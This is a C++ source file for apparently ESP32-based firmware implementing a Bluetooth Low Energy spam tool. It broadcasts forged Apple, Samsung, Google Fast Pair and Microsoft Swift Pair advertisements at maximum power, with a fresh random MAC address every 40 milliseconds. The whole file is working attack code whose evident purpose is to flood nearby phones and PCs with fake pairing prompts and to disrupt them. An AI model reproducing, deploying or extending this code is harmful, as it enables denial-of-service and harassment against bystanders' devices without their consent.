#include "BleSpammer.h"
#include "App.h"
#include "Logger.h"
#include <esp_mac.h> // For esp_base_mac_addr_set
#include <esp_bt.h>  // For esp_ble_tx_power_set

// Maximum BLE transmit power for ESP32-S3
#define MAX_TX_POWER ESP_PWR_LVL_P21

// --- Payload Data (from reference code) ---

// AppleJuice Payload Data
static const uint8_t IOS1[]{
    0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b, 0x0c, 0x11, 
    0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16,
};

static const uint8_t IOS2[]{
    0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27, 0x0b, 0x09, 
    0x02, 0x1e, 0x24,
};

// Google Fast Pair Models
struct DeviceType { uint32_t value; };
static const DeviceType android_models[] = {
    {0xCD8256}, {0x0000F0}, {0x821F66}, {0xF52494}, {0x718FA4}, {0x0002F0},
    {0x92BBBD}, {0x000006}, {0xD446A7}, {0x038B91}, {0x02F637}, {0x02D886},
    {0xF00000}, {0xF00001}, {0xF00201}, {0xF00305}, {0xF00E97}, {0x04ACFC},
    {0x04AA91}, {0x04AFB8}, {0x05A963}, {0x06AE20}, {0xD99CA1}, {0xAA187F}
};

// Samsung Watch Models
struct WatchModel { uint8_t value; };
static const WatchModel watch_models[] = {
    {0x1A}, {0x01}, {0x02}, {0x03}, {0x04}, {0x05}, {0x06}, {0x07}, {0x08},
    {0x09}, {0x0A}, {0x0B}, {0x0C}, {0x11}, {0x12}, {0x13}, {0x14}, {0x15},
    {0x16}, {0x17}, {0x18}, {0x1B}, {0x1C}, {0x1D}, {0x1E}, {0x20}
};

BleSpammer::BleSpammer() : 
    app_(nullptr), 
    isActive_(false), 
    currentMode_(BleSpamMode::ALL),
    currentSubMode_(BleSpamMode::APPLE_JUICE),
    lastPacketTime_(0)
{}

void BleSpammer::setup(App* app) {
    app_ = app;
}

void BleSpammer::start(BleSpamMode mode) {
    if (isActive_) return;
    
    // This now correctly initializes the entire BLE stack via HardwareManager
    if (!app_->getHardwareManager().requestHostControl(HostClient::BLE_HID)) {
        LOG(LogLevel::ERROR, "BLESPAM", "Failed to acquire BLE host control.");
        return;
    }
    
    // One-time setup after hardware is confirmed ready
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

    LOG(LogLevel::INFO, "BLESPAM", "Starting BLE Spam Mode: %d", (int)mode);
    isActive_ = true;
    currentMode_ = mode;
    currentSubMode_ = BleSpamMode::APPLE_JUICE; // Start cycle from first real mode
    lastPacketTime_ = 0;
}

void BleSpammer::stop() {
    if (!isActive_) return;
    LOG(LogLevel::INFO, "BLESPAM", "Stopping BLE Spam.");
    isActive_ = false;

    // --- MODIFIED: Ensure advertising is stopped before releasing control ---
    if(NimBLEDevice::getAdvertising() && NimBLEDevice::getAdvertising()->isAdvertising()) {
      NimBLEDevice::getAdvertising()->stop();
    }

    // This now correctly puts the stack into a clean idle state
    app_->getHardwareManager().releaseHostControl();
}

void BleSpammer::loop() {
    if (!isActive_) return;

    if (millis() - lastPacketTime_ > 40) {
        executeSpamPacket();
        lastPacketTime_ = millis();
    }
}


void BleSpammer::executeSpamPacket() {
    // --- REFACTORED: No more init() or deinit() in the loop ---
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    // --- THIS IS THE FIX: Revert to the low-level ESP-IDF call ---
    esp_base_mac_addr_set(macAddr);

    NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
    if (!pAdvertising) return; // Safety check
    
    BleSpamMode modeToSpam = currentMode_;
    if (modeToSpam == BleSpamMode::ALL) {
        // Cycle through modes for 'ALL'
        modeToSpam = currentSubMode_;
        currentSubMode_ = static_cast<BleSpamMode>((static_cast<int>(currentSubMode_) + 1));
        // If we've cycled past the last real mode, loop back to the first one.
        if (currentSubMode_ >= BleSpamMode::ALL) {
            currentSubMode_ = BleSpamMode::APPLE_JUICE;
        }
    }

    NimBLEAdvertisementData advertisementData = getAdvertisementData(modeToSpam);
    pAdvertising->setAdvertisementData(advertisementData);
    
    pAdvertising->start();
    vTaskDelay(20 / portTICK_PERIOD_MS); // Let advertisement run briefly
    pAdvertising->stop();
}


NimBLEAdvertisementData BleSpammer::getAdvertisementData(BleSpamMode type) {
    NimBLEAdvertisementData adData;

    switch (type) {
        case BleSpamMode::MICROSOFT: {
            const char* name = generateRandomName();
            uint8_t name_len = strlen(name);
            uint8_t* rawData = new uint8_t[7 + name_len];
            rawData[0] = 6 + name_len; // Length
            rawData[1] = 0xFF; // Manufacturer Specific
            rawData[2] = 0x06; rawData[3] = 0x00; // Microsoft Corp ID
            rawData[4] = 0x03; rawData[5] = 0x00; rawData[6] = 0x80;
            memcpy(&rawData[7], name, name_len);
            adData.addData(rawData, 7 + name_len);
            delete[] rawData;
            break;
        }
        case BleSpamMode::APPLE_JUICE: {
            if (random(2) == 0) {
                uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[random() % sizeof(IOS1)],
                                      0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 
                                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
                adData.addData(packet, 31);
            } else {
                uint8_t packet[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 
                                      0xc1, IOS2[random() % sizeof(IOS2)], 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 
                                      0x00, 0x00, 0x00};
                adData.addData(packet, 23);
            }
            break;
        }
        case BleSpamMode::SOUR_APPLE: {
            uint8_t packet[17];
            packet[0] = 16;   packet[1] = 0xFF; packet[2] = 0x4C; packet[3] = 0x00;
            packet[4] = 0x0F; packet[5] = 0x05; packet[6] = 0xC1;
            const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
            packet[7] = types[random() % sizeof(types)];
            esp_fill_random(&packet[8], 3);
            packet[11] = 0x00; packet[12] = 0x00; packet[13] = 0x10;
            esp_fill_random(&packet[14], 3);
            adData.addData(packet, 17);
            break;
        }
        case BleSpamMode::SAMSUNG: {
            uint8_t model = watch_models[random(sizeof(watch_models)/sizeof(watch_models[0]))].value;
            uint8_t samsungData[15] = {0x0F, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 
                                       0xFF, 0x00, 0x00, 0x43, model};
            adData.addData(samsungData, 15);
            break;
        }
        case BleSpamMode::GOOGLE: {
            const uint32_t model = android_models[random(sizeof(android_models)/sizeof(android_models[0]))].value;
            uint8_t googleData[14] = {0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE,
                                      (uint8_t)(model >> 16), (uint8_t)(model >> 8), (uint8_t)model,
                                      0x02, 0x0A, (uint8_t)(random(120) - 100)};
            adData.addData(googleData, 14);
            break;
        }
        default: break;
    }
    return adData;
}

void BleSpammer::generateRandomMac(uint8_t* mac) {
    esp_fill_random(mac, 6);
    mac[0] |= 0xC0; // Set MAC to random static
}

const char* BleSpammer::generateRandomName() {
    static char randomName[11];
    const char* charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    int len = rand() % 10 + 1;
    for (int i = 0; i < len; ++i) {
        randomName[i] = charset[rand() % (strlen(charset) - 1)];
    }
    randomName[len] = '\0';
    return randomName;
}

bool BleSpammer::isActive() const { return isActive_; }

const char* BleSpammer::getModeString() const {
    BleSpamMode mode = (currentMode_ == BleSpamMode::ALL) ? currentSubMode_ : currentMode_;
    switch (mode) {
        case BleSpamMode::APPLE_JUICE:  return "Apple Juice";
        case BleSpamMode::SOUR_APPLE:   return "Sour Apple";
        case BleSpamMode::SAMSUNG:      return "Samsung Spam";
        case BleSpamMode::GOOGLE:       return "Android Fast Pair";
        case BleSpamMode::MICROSOFT:    return "Windows Swift Pair";
        case BleSpamMode::ALL:          return "Tutti-Frutti";
        default:                        return "BLE Spam";
    }
}